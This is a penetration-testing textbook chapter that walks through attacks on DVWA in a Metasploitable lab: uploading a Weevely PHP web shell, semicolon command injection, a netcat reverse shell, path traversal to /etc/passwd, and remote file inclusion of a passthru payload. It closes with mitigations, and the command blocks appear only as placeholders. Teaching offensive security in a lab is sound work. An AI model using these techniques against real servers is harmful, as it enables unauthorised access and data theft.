- en: File Upload, Code Execution, and File Inclusion Vulnerabilities
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: This chapter will talk about different vulnerabilities and will explain how
    to perform them on the Metasploitable machine. A detailed illustration of the
    each of the scenarios will be covered. At the end of every section, we will also
    see a quick solution to each vulnerability explained.
  prefs: []
  type: TYPE_NORMAL
- en: 'The chapter will cover the following topics:'
  prefs: []
  type: TYPE_NORMAL
- en: File upload vulnerabilities
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Code execution vulnerabilities
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Local file inclusion vulnerabilities
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Basic mitigation
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: File upload vulnerabilities
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this chapter, we're going to have a look at file upload vulnerabilities.
    This is the simplest type of vulnerability because it allows us to upload any
    type of file. For example, if the target computer can understand PHP, then we
    can upload any PHP file or a PHP shell and get full control over the target computer.
  prefs: []
  type: TYPE_NORMAL
- en: If the target computer or the target server understands Python then we can just
    upload Python code or Python Shell. We can create these shells using Veil-Evasion
    or Metasploit, or we can use our own PHP or Python Shell.
  prefs: []
  type: TYPE_NORMAL
- en: In the next section, we are going to have a look at a tool called Weevely that
    generates PHP shells and allows us to gain access to and do a number of cool things
    on the target computer.
  prefs: []
  type: TYPE_NORMAL
- en: Getting started with Weevely
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: When we're trying to pen test a website, before trying to use any tools or any
    other means, after we perform our information gathering, first browse the website.
    Just get a feel of the website, see what's installed on it, and try to exploit
    the features.
  prefs: []
  type: TYPE_NORMAL
- en: 'After going through the website, upload a file using the Upload tab. The website
    allows us to upload a file. Sometimes in penetration testing tasks, it could be
    a website that''s allowing us to upload a profile picture or a classified website
    allowing us to upload pictures of cars:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/01655443-90ed-44ab-91c7-b4a03732e422.png)'
  prefs: []
  type: TYPE_IMG
- en: As we can see in the preceding screenshot, the website expects us to choose
    and upload an image. Choose any image by clicking the Browse... button, and upload
    a picture by clicking the Upload button.
  prefs: []
  type: TYPE_NORMAL
- en: 'We can now see, in the following screenshot, that the image has been uploaded
    successfully:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/ee6ab740-18ce-4128-9528-1b08d6218926.png)'
  prefs: []
  type: TYPE_IMG
- en: It's placed in `../../hackable/uploads/image.jpeg`, which means two directories
    backward followed by the filename.
  prefs: []
  type: TYPE_NORMAL
- en: 'Let''s see whether the picture has actually been uploaded. We''re going to
    use two directories, the vulnerabilities (`10.0.2.4/dvwa`) and upload (`hackable/uploads/image.jpeg`).
    We are using the directories just to ensure that the picture was uploaded properly.
    Once we add the directories to the address bar, we will see that the picture has
    been successfully uploaded:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/8475789f-16a3-4900-8e28-084c51c24eae.png)'
  prefs: []
  type: TYPE_IMG
- en: The next thing we want to do is try uploading a PHP file, and to do that we're
    going to use a tool called Weevely. As said before, to create a payload or a shell,
    if that's what we want to call it (and it obviously is going to be a PHP shell),
    we can use Metasploit. To create a PHP payload, we're going to use a different
    tool that's designed for web application penetration testing.
  prefs: []
  type: TYPE_NORMAL
- en: 'It''s quite easy to use. First, we are going to type the tool name `weevely`
    and add `generate` because we want to generate a payload or a shell file. Then
    we will put a password for the file so that only we can access it and control
    the website. As demonstrated in the following snippet, the password is `123456`
    and we want to store it in the `/root` location, called `shell.php`. The command
    is as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE0]'
  prefs: []
  type: TYPE_PRE
- en: So, `weevely` is the name of the program, `generate` is to generate a shell,
    followed by the password, for authentication purposes, which is stored in `/root/shell.php`.
  prefs: []
  type: TYPE_NORMAL
- en: 'Hit *Enter* and create it. As we can see in the following screenshot, the file
    is generated at the specified location:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/eb903568-be93-4307-a2de-ae1ae01b7097.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Now go back to the DVWA website and upload the `shell.php` file the same way
    we uploaded the image. All we need to do is use run the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE1]'
  prefs: []
  type: TYPE_PRE
- en: 'This process is similar to multi-handler waiting for a connection to the backdoor.
    We are connecting the backdoor that we uploaded, and we can see in the following
    screenshot we are in the filesystem:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/577b3b45-56fd-4945-8b24-77956d4f9f2c.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Using `weevely`, we''ll can just type in any Linux command, which will be executed
    on the target computer, and for which we can see the results. If we type `pwd`
    we will be able to see the location `/var/www/dvwa/hackable/uploads`, and if we
    type `id`, we will be able to see the user, which is the `www-data`. If we type
    `uname -a`, just to confirm that this is the Metasploitable machine, it will give
    us the following output:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/39338a0e-1566-402d-899a-2fac1232a2e9.png)'
  prefs: []
  type: TYPE_IMG
- en: 'We can do anything we want: list the files, navigate; we can perform any Linux
    command that we want. Weevely also offers many more features. If we type in `help`,
    we''ll be able to see more functionalities of Weevely. We can try to escalate
    our privileges, execute SQL queries, and a lot of cool stuff that is just designed
    for web application penetration testing.'
  prefs: []
  type: TYPE_NORMAL
- en: Code execution vulnerabilities
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: This type of vulnerability allow us to execute the **operating system** (**OS**)
    code on the target server. If the target server uses Windows, we will be able
    to execute Windows commands. If it uses Linux, then we will be able to use Linux
    commands.
  prefs: []
  type: TYPE_NORMAL
- en: This is a critical vulnerability that would allow the attacker to do anything
    they want with the target's server. We can upload a PHP shell using the `wget`
    command, or upload a payload, a virus, using the `wget` Linux command. We just
    need to make sure that we're uploading it to a file or to a directory that we're
    allowed to write to.
  prefs: []
  type: TYPE_NORMAL
- en: Another way of exploiting this vulnerability is to just run OS commands and
    get a reverse shell based on these commands. We can run OS commands and the programming
    languages supported by the OS in order to try and get a reverse connection on
    our computer.
  prefs: []
  type: TYPE_NORMAL
- en: Let's assume that we are browsing and click on the Command Execution tab on
    DVWA, which take us to the textbox website, which will ping for free. We should
    always try to experiment with the input box we see, try to see what that input
    box does and what can we inject into it, and what can we do to get hacking started.
  prefs: []
  type: TYPE_NORMAL
- en: 'So, for example, this input box is asking us to ping, and if we put in an IP,
    for example, we''re going to put `10.0.2.15`. After filling in the details, click
    on submit. We can see the ping results in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/d6d527bc-d13c-4ad2-a8ca-174d854e42ad.png)'
  prefs: []
  type: TYPE_IMG
- en: We can view the execution of the `ping` command in Linux systems. Now let's
    see if we can exploit, if it's actually executing the `ping` command.
  prefs: []
  type: TYPE_NORMAL
- en: How would we exploit it if it's accepting what we're inputting, and then it
    will `ping` the command?
  prefs: []
  type: TYPE_NORMAL
- en: In Linux and Unix-based commands, we can use the semicolon (`;`) sign to execute
    multiple commands on one line, for example, `10.20.14.203;`.
  prefs: []
  type: TYPE_NORMAL
- en: If we try writing this command on the Terminal. Let's start by writing the list
    command, `ls`, and then `pwd`, which is the working directory. So if we write
    `ls;` followed by `pwd`, it will execute both commands. It will also display the
    working directory.
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/6411da96-1431-40e8-aa2b-e8c0c63e062c.png)'
  prefs: []
  type: TYPE_IMG
- en: 'This time, we will be adding `pwd` next to the IP address. Here''s it how it
    should look:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE2]'
  prefs: []
  type: TYPE_PRE
- en: 'Let''s now see what will the execution look like. Go back to the DVWA server
    and write `10.0.2.15; pwd` on the address bar and then click `submit`. This screenshot
    shows us the current location of our working directory (`var/www/dvwa/vulnerabilities/exec`):'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/d134b4bf-0891-4442-8464-3d622803dc7b.png)'
  prefs: []
  type: TYPE_IMG
- en: It clearly notes the `pwd` that was inserted is executed, which means that we
    can insert any commands and it will surely be executed.
  prefs: []
  type: TYPE_NORMAL
- en: Download the `code-execution-reverse-shell-commands.txt` resources file with
    commands from the book's GitHub repository to get a reverse connection from the
    target computer. There are a number of commands that will give us a reverse connection.
    All of the commands depend on the programming language. We have commands in PHP,
    Ruby, PERL, and BASH.
  prefs: []
  type: TYPE_NORMAL
- en: BASH is the Linux shell command language, so all Unix OS will be able to execute
    BASH commands. The `bash` command should work on most Unix-based systems. Again,
    most users would use Python and Netcat. We will be using Netcat in this chapter.
  prefs: []
  type: TYPE_NORMAL
- en: 'Before getting started, we''re going to listen for connections the way we did
    previously with Metasploit for multi-handling. We can use a multi-handler to listen
    to the connections. Netcat is just a tool that allows us to listen to and connect
    computers together. Use the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE3]'
  prefs: []
  type: TYPE_PRE
- en: 'The `8080` is the port, `nc` is the program, and `vv` is used for viewing verbose
    output. We can check the output and see whether anything goes wrong. The `-l -p`
    command on `8080` is used for listening. Hit *Enter*, and we will able to see
    the following message:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/31412be5-540e-477b-aa82-4fe91dfbfea3.png)'
  prefs: []
  type: TYPE_IMG
- en: The next command is going to help us connect the web server back to our computer
    using Netcat. So, let's assume that the web server has Netcat, and we check how
    it works.
  prefs: []
  type: TYPE_NORMAL
- en: 'Refer to the Netcat command from the `code-execution-reverse-shell-commands.txt`
    file, which had all the commands written in it. Here is the command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE4]'
  prefs: []
  type: TYPE_PRE
- en: As shown, we will use `/bin/sh`, the current IP of the device, the attacker
    device, followed by the port. In our case, it will be `10.0.2.14 8080`.
  prefs: []
  type: TYPE_NORMAL
- en: 'Copy the command and paste it into the address bar of DVWA server so that the
    `pwd` command is executed. Previously, the command that was used was `10.0.2.15;
    pwd`. But now let''s try removing the `pwd` and then paste the code. Here is the
    command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE5]'
  prefs: []
  type: TYPE_PRE
- en: 'This first IP connects the web server back to the Kali machine and then to
    the attacker machine:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/b0c3cf36-3b0c-4060-be19-df5fe495a526.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Go back to the Terminal, and we will be to see a connection call to `10.0.2.4`
    from `10.0.2.15`, and we will again be adding `pwd`, `ls`, and `id`. As shown
    in the screenshot, when we insert the `id` command, we will get `www- data` and
    we can then add `uname` just to confirm whether it''s Metasploitable. Here''s
    a screenshot depicting this information:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/a1d594f0-b9a4-4bfa-acbf-c83d5d69278d.png)'
  prefs: []
  type: TYPE_IMG
- en: We can run any commands on the target computer and have access to the target
    computer.
  prefs: []
  type: TYPE_NORMAL
- en: Local file inclusion vulnerabilities
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Local file exploits or vulnerabilities allow us to read any file that is within
    the same server as the vulnerability; even if the file exists outside the `/var/www`
    directory, we'll be able to read the information within it.
  prefs: []
  type: TYPE_NORMAL
- en: A vulnerability is critical because we can read any files, such as important
    files or password files. Also, if there are a number of websites on the same server
    and we managed to find a website that we're not targeting, then we might be able
    to access files related to the website that we're targeting and then further exploit
    the website from there.
  prefs: []
  type: TYPE_NORMAL
- en: We are going to exploit the vulnerability through the URL. So, usually in our
    code execution examples, we write the code in the textbox. Sometimes, we might
    find the code vulnerability in the URL, which will have keywords such as `cmd`.
  prefs: []
  type: TYPE_NORMAL
- en: The same old process continues. Click on the File Inclusion tab on the DWVA
    server and the URL we get is `http://10.0.2.4/dvwa/vulnerabilities/fi/?page=include.php`.
  prefs: []
  type: TYPE_NORMAL
- en: 'We can see that the file already has a page. The `include.php` command will
    again load another page. As in the previous example, we will again see the URL
    with the IP address and the same `ping` command, as explained in the previous
    section. Here, in our example, the objective is to open a file using `include.php`.
    After removing the `page` term from the URL, the URL now will be visible as `http://10.0.2.4/dvwa/vulnerabilities/fi/include.php`.
    There is a fatal error generated, as shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/cc6915b5-75c5-4615-a7be-faf0ad4eb527.png)'
  prefs: []
  type: TYPE_IMG
- en: 'We can see a file named `include.php` on the page, which is in the same working
    directory. Let''s try and see whether we can read a file called `/etc/passwd`
    that is stored in the computer. It''s the file containing all the user passwords
    present on the current web server and all the users using the current OS. Let''s
    go to the Terminal and run some commands. For example, running `cat/etc/passwd`
    on Kali returns the following output:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/aef8cfc7-f88f-4264-8d16-101907f5ecf1.png)'
  prefs: []
  type: TYPE_IMG
- en: We will see all the users that we have been on the current computer and their
    default paths on the current OS. We will now try to read the `passwd` file. To
    do this, go back to the current location in the `fi` directory, which was mentioned
    before. Referring to the previous screenshot, when in `/var/www/dvwa/vulnerabilities/fi/include.php`,
    we are in the `fi` directory; we need to go back five places back to get to `/etc/passwd`.
  prefs: []
  type: TYPE_NORMAL
- en: 'As explained, we will need to go five places back by adding double dots. So,
    the URL changes to `http://10.0.2.4/dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd`.
    The output will be seen once we hit *Enter* is as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/a7a7b044-3b8c-4fa1-bacb-a903a6bd82b5.png)'
  prefs: []
  type: TYPE_IMG
- en: We will be able to see the `/etc/passwd` files. To understand and read the data,
    copy the data on a notepad. By doing so, we will get more information about the
    targeted websites. We can also access different, sensitive files, or files of
    other websites on the same server. The next section will help us understand remote
    file inclusion using Metasploitable.
  prefs: []
  type: TYPE_NORMAL
- en: Remote file inclusion using Metasploitable
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Remote file inclusion is a special way of exploiting file inclusion vulnerabilities.
    In the previous section, we learned how to include a file in the server and the
    ways to access it through local file inclusion vulnerabilities.
  prefs: []
  type: TYPE_NORMAL
- en: In this section, we will learn how to configure a server so that it allows the
    `allow_url` and `allow_url_fopen` functions. This will allow the inclusion of
    a file from a computer to the target website. We will learn how to inject a PHP
    file into the target computer, which will help us to run payloads and reverse
    shells and system commands, allowing access to the target or full control of the
    target server.
  prefs: []
  type: TYPE_NORMAL
- en: Let's get started by exploiting the file inclusion vulnerability that was discussed
    in the previous section. We will be using the same `page` parameter here. The
    only thing that is different here is the transition from local file inclusion
    to remote file inclusion. This will ensure that the local file inclusion will
    allow the accessing of local files, and remote file inclusion will allow the accessing
    and injection of remote files.
  prefs: []
  type: TYPE_NORMAL
- en: 'Let''s test the vulnerability using the Metasploitable framework. In the framework,
    we will be using PHP settings, which are stored in the file. To access them, we
    will use `nano`, which is a text editor. We need to type the location of the configuration
    file, which is at `/``etc/php5/cgi/php.ini`, into the `nano` editor. `/etc/php5/cgi` is
    the actual location where our PHP configuration file is located. We need to add
    `sudo` as the root. In Kali, we do not need to add `sudo`, because we log in as
    `root`, but in Metaspolitable, we need to add `sudo` to carry out `root` actions.
    After adding `sudo` to the present command, run the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE6]'
  prefs: []
  type: TYPE_PRE
- en: 'If we want to search for the `allow_url_fopen` function, press *Ctrl* + *W*
    and type `allow_url` and hit *Enter*. We will be able to see that `allow_url_fopen`
    and `allow_url_include` are `On`:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/a0b21332-5f1b-4e60-b473-c4dbaff94c23.png)'
  prefs: []
  type: TYPE_IMG
- en: If we enable these two functions, then the local file inclusion vulnerability
    can be used for remote file inclusion. To exit the current operation, use *Ctrl *+
    *X;* to save, use *Ctrl* + *Y* and *Enter.* After saving the file restart the
    web server, by entering `sudo /etc/init.d/apache2 restart`.
  prefs: []
  type: TYPE_NORMAL
- en: We learned about the local file inclusion vulnerabilities work. We used the
    five-spaces-back method to access the `passwd` file. In remote file inclusion,
    we're going to access a file that is located on a different server.
  prefs: []
  type: TYPE_NORMAL
- en: 'Now we will be using a pen test on an actual web server in order to get access
    to the file that is stored. The file should either have an IP address or a domain
    name. We need to run this on a local server and store the file on the web server
    of the Kali machine using `10.0.2.15`, in our case. The file could be a web shell
    or payload. Now create a simple PHP file. We will be using the `passthru()` function,
    which will execute OS commands for Windows and Linux. Which commands are going
    to be executed completely depends on the web server that they will be executed
    on. Create a file called `reverse.txt` with following code:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE7]'
  prefs: []
  type: TYPE_PRE
- en: We will be using the `nc` command that was used for code execution vulnerability,
    which allowed us to get a connection or a reverse connection from our target.
  prefs: []
  type: TYPE_NORMAL
- en: 'The code starts and ends with `<?php` and `?>` tags. The commands will be placed
    between the quotation marks. Since we are using the same `nc` command, it will
    reverse the connection of the computer. The next step is to store this file in
    a we server. If the target is a remote web server, then we should store the file
    with IP so that we access the file from the remote web server. We will access
    the file using a Metasploitable machine, which will access stored files on the
    Kali machine. This is possible since the files and the machines are on the same
    network. The current file starts with `/var/www/html`, so the file will be stored
    on Kali and not on Metasploitable. In order to reverse it, we will be saving the
    file as `.txt` and not `.php`. If we store the file as PHP, it is going to be
    executed on the Kali machine. As we know, we already have access to the Kali machine,
    and we need to get access to the file on Metasploitable. To do this, we will save
    the file as `reverse.txt` on the `localhost`, which is in, `/var/www/html` directory.
    The file is still stored on `localhost` and not Metasploitable, so it''s at `10.0.2.15`.
    To check the whether `reverse.txt` file is on `localhost`, type `localhost/reverse.txt` in
    the address bar and press *Enter*. The file will be displayed in the browser:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/f33f8c90-c206-422d-8338-2e60d9e55956.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Before starting the remote inclusion, listen for the connections on Kali in
    the same way as  in the *Code execution vulnerabilities* section. Type the following
    `nc` command to listen for the connections:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE8]'
  prefs: []
  type: TYPE_PRE
- en: 'Now we should be listening for the connections, as shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/b9820fce-af6a-42ec-87a4-e482d3970bfe.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Now, instead of including the file on the same server, we will include the
    remote file in the URL. The URL changes to `http://10.0.2.4/dvwa/vulnerabilities/fi/?page=http://10.0.2.15/reverse.txt`
    as shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/317eb379-3fb3-464e-b372-98051963c1ac.png)'
  prefs: []
  type: TYPE_IMG
- en: 'If we now check the file, it will be executed on `10.0.2.15`, which is now
    going to give us a remote connection to a Metasploitable computer. Go back to
    the Terminal, and if we type `uname - a`, we will now get full access to the Metasploitable
    machine, as shown in the following screenshot:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/82b27373-17e9-4fe2-ba90-47eec00d6294.png)'
  prefs: []
  type: TYPE_IMG
- en: We can also execute commands such as `ls` and `pwd` on the Metasploitable machine.
  prefs: []
  type: TYPE_NORMAL
- en: Basic mitigation
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: This section talks about the prevention of vulnerabilities. A lot of vulnerabilities
    exist because of the functionalities that they provide.
  prefs: []
  type: TYPE_NORMAL
- en: For example, in the first section, *File upload vulnerabilities*, we talked
    about allowing the upload of any file extension. The ideal case is to check the
    file type, if a user is uploading a file; it should be an MP3 or a media file,
    not a PHP file or some executable code. We should never allow users to upload
    executables. Filters can be used to check the extension. The best way to do this
    is to check the file instead of just checking the extension, because files can
    bypass the extension check. Check the picture or the media instead of relying
    on the extension.
  prefs: []
  type: TYPE_NORMAL
- en: In the second section, *Code execution vulnerabilities*, we explored how we
    can run any code on a target computer. We should avoid allowing users to run code
    on the server. Also, avoid functions such as `eval` and `passthru`, which allow
    users to run OS code on the server. If we have to use these functions, analyze
    the input before execution.
  prefs: []
  type: TYPE_NORMAL
- en: 'Take a look at this, for example:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE9]'
  prefs: []
  type: TYPE_PRE
- en: Suppose we type an IP, `10.0.2.15`, and then add a semicolon, and a command, `ls-la`.
    The only problem is the web application accepts the information the way it is
    copied and run. When we execute the command, we will see the IP address first
    and then the `ls-la` command. In such cases, check the input that was entered.
    If we are expecting an IP address, we can use a regex. A regex is a rule that
    will ensure that the input conforms with the format `10.0.2.15`. If we enter any
    other input, the web application would reject it. We should also ensure that there
    are no semicolons or spaces, and that everything comes as one thing and gets executed.
    These are many secure ways of execution, but the best thing to do is avoid `eval`
    and `passthru` functions.
  prefs: []
  type: TYPE_NORMAL
- en: The third section was on file inclusion, which was further divided into local
    and remote file inclusion. Local file inclusion allowed us to include any file
    on the target system, and to read files that had been disclosed by a vulnerability.
    Remote file inclusion was also looked at, which allows us to include any file
    from a web server that has PHP shells and gain a connection to the target computer.
  prefs: []
  type: TYPE_NORMAL
- en: We need to prevent remote file inclusion so that people cannot include files
    outside our server. We can enable this method using the `php.ini` file by disabling
    the `allow_url_fopen` and `allow_url_include` functions. To disable the functions,
    follow the steps used in the *Remote file inclusion using Metasploitable* section.
  prefs: []
  type: TYPE_NORMAL
- en: 'Ensure that the settings for `allow_url_fopen` and `allow_url_include` are
    set to `Off`:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/b63661fe-bd6e-4a90-b5ec-ebd8211812f7.png)'
  prefs: []
  type: TYPE_IMG
- en: The other way to prevent these exploits is to use static file inclusion. So
    instead of using dynamic file inclusion, which we've seen, we can hardcode the
    files that we want to include in the code and not have to get them using `GET`
    or `POST`.
  prefs: []
  type: TYPE_NORMAL
- en: 'For example, in the vulnerability cases, we used the `page` parameter with
    the `index.php` page. Now, the `index.php` page uses the `include` parameter or
    otherwise takes another page called `news.php`, which will be included in the
    `$_GET();` parameter in the code. The following screenshot explains the vulnerability:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/466391a5-351b-4516-9d27-3c90331635d2.png)'
  prefs: []
  type: TYPE_IMG
- en: The fundamental thing is to `include` files that come after the `page` parameter.
    The code will dynamically take the files that come after the `page` parameter
    in the URL and `include` everything from URL to the current page. In some cases,
    we tend to use the `POST` method, which will not get the same executions; however,
    in such cases, it's best to use a proxy, such as Burp Proxy. It will help us to
    make modifications and include the files that we want to display. By using this
    approach, we won't be able to manipulate anything inside the page that is included.
    To avoid hard code and prevent using a variable, simply provide the page that
    needs to be included. This will make the code look longer but the page will be
    much more secure.
  prefs: []
  type: TYPE_NORMAL
- en: 'The following screenshot shows us an easier way of hardcoding:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](assets/33dc1581-1f24-4138-a97d-ec31606b75b6.png)'
  prefs: []
  type: TYPE_IMG
- en: Summary
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this chapter, we learned about basic file uploads using file vulnerabilities.
    We also looked at how to execute OS code under code vulnerabilities. Furthermore,
    we learned about local and remote file inclusion using Metasploitable. Finally,
    we learned about the problem-solving takeaways that should be considered when
    working with these vulnerabilities. The next chapter will dive deep into SQL injection
    vulnerabilities.
  prefs: []
  type: TYPE_NORMAL
